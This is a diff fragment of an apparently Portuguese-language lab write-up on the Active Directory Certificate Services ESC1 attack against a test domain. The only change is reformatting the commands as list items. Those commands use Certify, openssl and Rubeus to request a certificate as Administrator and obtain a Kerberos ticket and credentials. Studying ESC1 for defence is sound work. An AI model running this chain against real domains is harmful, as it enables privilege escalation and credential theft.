@@ -41,10 +41,10 @@ Domain Users pode se inscrever	✅ TRUE	fcastle (como Domain User) pode solicita
   <img width="1491" height="857" alt="hashandin" src="https://github.com/user-attachments/assets/329c2fbd-b523-476c-ad00-5b54e1b02797" />
 
 ### Windows
-``` .\Certify.exe find /vulnerable``` para recon
-```.\Certify.exe request /ca:MARVEL.local\\MARVEL-HYDRA-DC-CA /template:ESC1-User-Vuln /altname:Administrator```
-``` openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx``` (convertir .pem a .pfx)
-``` .\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials /show /nowrap```
+- ``` .\Certify.exe find /vulnerable``` para recon
+- ```.\Certify.exe request /ca:MARVEL.local\\MARVEL-HYDRA-DC-CA /template:ESC1-User-Vuln /altname:Administrator```
+- ``` openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx``` (convertir .pem a .pfx)
+- ``` .\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials /show /nowrap```
 
 
 ## 🛡️ PREVENÇÕES CONTRA ESC1
